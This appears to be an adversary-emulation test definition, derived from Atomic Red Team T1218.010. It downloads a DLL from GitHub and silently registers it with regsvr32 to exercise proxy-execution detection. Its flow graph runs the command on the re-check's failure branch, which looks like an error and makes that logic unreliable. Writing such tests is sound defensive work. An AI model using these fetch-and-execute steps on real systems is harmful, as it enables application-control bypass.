{
  "id": "9d71c492-ea2e-4c08-af16-c6994cdf029f",
  "name": "Regsvr32 Silent DLL Install Call DllRegisterServer",
  "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "c026b6a5-3f38-47f8-8bec-8f81e3ef008d",
      "type": "execute-command",
      "data": {
        "command": "#{regsvr32path}\\#{regsvr32name} /s /i \"#{dll_name}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "e937fd16-ce29-4f05-8a91-8ef52fd88b3f",
      "name": "Check dependency 1/1",
      "description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "48c086db-a0ad-4ae2-b976-a5186b98d2ab",
      "name": "Resolve dependency 1/1",
      "description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\"",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "33341afe-659b-4f3f-81b8-74440033f08d",
      "name": "Re-check dependency 1/1",
      "description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "e937fd16-ce29-4f05-8a91-8ef52fd88b3f",
      "p": "on-success",
      "o": "c026b6a5-3f38-47f8-8bec-8f81e3ef008d"
    },
    {
      "s": "e937fd16-ce29-4f05-8a91-8ef52fd88b3f",
      "p": "on-failure",
      "o": "48c086db-a0ad-4ae2-b976-a5186b98d2ab"
    },
    {
      "s": "48c086db-a0ad-4ae2-b976-a5186b98d2ab",
      "p": "on-success",
      "o": "33341afe-659b-4f3f-81b8-74440033f08d"
    },
    {
      "s": "33341afe-659b-4f3f-81b8-74440033f08d",
      "p": "on-failure",
      "o": "c026b6a5-3f38-47f8-8bec-8f81e3ef008d"
    }
  ],
  "tags": [
    "T1218.010",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "dll_name",
      "type": "string",
      "description": "Name of DLL to Install",
      "value": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll"
    },
    {
      "name": "regsvr32path",
      "type": "string",
      "description": "Default location of Regsvr32.exe",
      "value": "C:\\Windows\\system32"
    },
    {
      "name": "regsvr32name",
      "type": "string",
      "description": "Default name of Regsvr32.exe",
      "value": "regsvr32.exe"
    }
  ]
}